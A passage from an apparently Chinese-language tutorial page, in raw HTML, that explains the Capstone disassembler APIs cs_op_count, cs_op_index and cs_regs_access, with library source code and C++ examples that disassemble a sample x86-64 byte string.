class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line"></span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"is REG:   "</span> &lt;&lt; cs_op_count(handle, insn, X86_OP_REG) &lt;&lt; <span class="built_in">endl</span>;   <span class="comment">//判断是否为寄存操作码</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c32814f9e736661.jpg" alt></p><h3 id="cs-op-index"><a href="#cs-op-index" class="headerlink" title="cs_op_index"></a>cs_op_index</h3><p><code>int CAPSTONE_API cs_op_index(csh handle, const cs_insn *insn, unsigned int op_type, unsigned int position);</code></p><p>检索给定类型的操作数在<code>&lt;arch&gt;.operands[]</code>数组中的位置, 使用返回的位置访问操作数。<br>注意：只有当detail选项为ON时这个API可用 (默认OFF).</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()接收的反汇编指令结构<br>op_type: 要找到的操作数类型。<br>position: 要查找的操作数的位置。范围一定在<code>[1, cs_op_count(handle, insn, op_type)]</code>内<br>return: 指令insn的<code>&lt;arch&gt;.operands[]</code>数组中给定类型op_type的操作数的索引，失败时返回-1。</p><p>代码实现</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> CAPSTONE_API <span class="title">cs_op_index</span><span class="params">(csh ud, <span class="keyword">const</span> cs_insn *insn, <span class="keyword">unsigned</span> <span class="keyword">int</span> op_type,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">unsigned</span> <span class="keyword">int</span> post)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> count = <span class="number">0</span>, i;</span><br><span class="line"><span class="keyword">if</span> (!ud)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;id) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_SKIPDATA;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">handle-&gt;errnum = CS_ERR_OK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">switch</span> (handle-&gt;arch) &#123;</span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">handle-&gt;errnum = CS_ERR_HANDLE;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm.operands[i].type == (arm_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_ARM64:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;arm64.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;arm64.operands[i].type == (arm64_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_X86:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;x86.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;x86.operands[i].type == (x86_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_MIPS:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;mips.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;mips.operands[i].type == (mips_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_PPC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;ppc.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;ppc.operands[i].type == (ppc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SPARC:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sparc.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sparc.operands[i].type == (sparc_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_SYSZ:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;sysz.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;sysz.operands[i].type == (sysz_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_XCORE:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;xcore.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;xcore.operands[i].type == (xcore_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M68K:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m68k.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m68k.operands[i].type == (m68k_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_TMS320C64X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;tms320c64x.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;tms320c64x.operands[i].type == (tms320c64x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> CS_ARCH_M680X:</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; insn-&gt;detail-&gt;m680x.op_count; i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (insn-&gt;detail-&gt;m680x.operands[i].type == (m680x_op_type)op_type)</span><br><span class="line">count++;</span><br><span class="line"><span class="keyword">if</span> (count == post)</span><br><span class="line"><span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">cs_x86* x86;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, &amp;handle);</span><br><span class="line"><span class="keyword">if</span> (err) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Failed on cs_open() with error returned: %u\n"</span>, err);</span><br><span class="line"><span class="built_in">abort</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (platforms[i].opt_type)</span><br><span class="line">cs_option(handle, platforms[i].opt_type, platforms[i].opt_value);</span><br><span class="line"></span><br><span class="line">cs_option(handle, CS_OPT_DETAIL, CS_OPT_ON);</span><br><span class="line"></span><br><span class="line">insn = cs_malloc(handle);</span><br><span class="line">x86 = &amp;(insn-&gt;detail-&gt;x86);</span><br><span class="line">print_string_hex(platforms[i].code, platforms[i].size);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Disasm:\n"</span>);</span><br><span class="line"></span><br><span class="line">address = <span class="number">0x1000</span>;</span><br><span class="line">code = platforms[i].code;</span><br><span class="line">size = platforms[i].size;</span><br><span class="line"><span class="keyword">while</span> (cs_disasm_iter(handle, &amp;code, &amp;size, &amp;address, insn)) &#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%"</span> PRIx64 <span class="string">":\t%s\t\t%s          "</span>,</span><br><span class="line">insn-&gt;address, insn-&gt;mnemonic, insn-&gt;op_str);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">count = cs_op_count(handle, insn, X86_OP_IMM);  <span class="comment">//查找立即数</span></span><br><span class="line"><span class="keyword">if</span> (count) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timm_count: %u\n"</span>, count);</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">1</span>; i &lt; count + <span class="number">1</span>; i++) &#123;</span><br><span class="line"><span class="keyword">int</span> index = cs_op_index(handle, insn, X86_OP_IMM, i);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timms[%u]: 0x%"</span> PRIx64 <span class="string">"\n"</span>, i, x86-&gt;operands[index].imm);</span><br><span class="line"><span class="keyword">if</span> (x86-&gt;encoding.imm_offset != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timm_offset: 0x%x\n"</span>, x86-&gt;encoding.imm_offset);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (x86-&gt;encoding.imm_size != <span class="number">0</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\timm_size: 0x%x\n"</span>, x86-&gt;encoding.imm_size);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">cs_free(insn, <span class="number">1</span>);</span><br><span class="line">cs_close(&amp;handle);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">test();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出<br><img src="https://i.loli.net/2019/07/27/5d3c45bfef22464773.jpg" alt></p><h3 id="cs-regs-access"><a href="#cs-regs-access" class="headerlink" title="cs_regs_access"></a>cs_regs_access</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_regs_access</span><span class="params">(csh handle, <span class="keyword">const</span> cs_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_read, <span class="keyword">uint8_t</span> *regs_read_count,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_write, <span class="keyword">uint8_t</span> *regs_write_count)</span></span>;</span><br></pre></td></tr></table></figure><p>检索由一条指令显式或隐式访问的所有寄存器。</p><p>注意： 在“diet”模式下，此API不可用，因为引擎不存储寄存器。</p><p>handle: cs_open()返回的句柄<br>insn: 从cs_disasm()或cs_disasm_iter()返回的反汇编指令结构<br>regs_read:返回时，这个数组包含所有按指令读取的寄存器。<br>regs_read_count:保存在regs_read数组中的寄存器数。<br>regs_write:返回时，这个数组包含所有由指令修改的寄存器。<br>regs_write_count:保存在regs_write数组中的寄存器数。<br>成功时返回CS_ERR_OK，失败时返回其他值(详细错误请参阅cs_err enum)。</p><p>代码实现</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">cs_err CAPSTONE_API <span class="title">cs_regs_access</span><span class="params">(csh ud, <span class="keyword">const</span> cs_insn *insn,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_read, <span class="keyword">uint8_t</span> *regs_read_count,</span></span></span><br><span class="line"><span class="function"><span class="params">cs_regs regs_write, <span class="keyword">uint8_t</span> *regs_write_count)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cs_struct</span> *<span class="title">handle</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ud)</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">handle = (struct cs_struct *)(<span class="keyword">uintptr_t</span>)ud;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CAPSTONE_DIET</span></span><br><span class="line"><span class="comment">// This API does not work in DIET mode</span></span><br><span class="line">handle-&gt;errnum = CS_ERR_DIET;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_DIET;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line"><span class="keyword">if</span> (!handle-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_DETAIL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;id) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_SKIPDATA;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_SKIPDATA;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!insn-&gt;detail) &#123;</span><br><span class="line">handle-&gt;errnum = CS_ERR_DETAIL;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_DETAIL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (handle-&gt;reg_access) &#123;</span><br><span class="line">handle-&gt;reg_access(insn, regs_read, regs_read_count, regs_write, regs_write_count);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// this arch is unsupported yet</span></span><br><span class="line">handle-&gt;errnum = CS_ERR_ARCH;</span><br><span class="line"><span class="keyword">return</span> CS_ERR_ARCH;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> CS_ERR_OK;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"capstone.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"platform.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> &#123;</span></span><br><span class="line">cs_arch arch;</span><br><span class="line">cs_mode mode;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">char</span>* comment;</span><br><span class="line">cs_opt_type opt_type;</span><br><span class="line">cs_opt_value opt_value;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">print_string_hex</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span>* str, <span class="keyword">size_t</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span>* c;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Code: "</span>);</span><br><span class="line"><span class="keyword">for</span> (c = str; c &lt; str + len; c++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"0x%02x "</span>, *c &amp; <span class="number">0xff</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> X86_CODE64 <span class="meta-string">"\x55\x48\x8b\x05\xb8\x13\x00\x00\xe9\xea\xbe\xad\xde\xff\x25\x23\x01\x00\x00\xe8\xdf\xbe\xad\xde\x74\xff"</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">platform</span> <span class="title">platforms</span>[] = &#123;</span></span><br><span class="line">&#123;</span><br><span class="line">CS_ARCH_X86,</span><br><span class="line">CS_MODE_64,</span><br><span class="line">(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)X86_CODE64,</span><br><span class="line"><span class="keyword">sizeof</span>(X86_CODE64) - <span class="number">1</span>,</span><br><span class="line"><span class="string">"X86 64 (Intel syntax)"</span></span><br><span class="line">&#125;,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">csh handle;</span><br><span class="line"><span class="keyword">uint64_t</span> address;</span><br><span class="line">cs_insn* insn;</span><br><span class="line">cs_detail* detail;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line">cs_err err;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">uint8_t</span>* code;</span><br><span class="line"><span class="keyword">size_t</span> size;</span><br><span class="line"></span><br><span class="line">cs_x86* x86;</span><br><span class="line">cs_regs regs_read, regs_write;</span><br><span class="line"><span class="keyword">uint8_t</span> regs_read_count, regs_write_count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> count;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(platforms) / <span class="keyword">sizeof</span>(platforms[<span class="number">0</span>]); i++) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"****************\n"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Platform: %s\n"</span>, platforms[i].comment);</span><br><span class="line">err = cs_open(platforms[i].arch, platforms[i].mode, 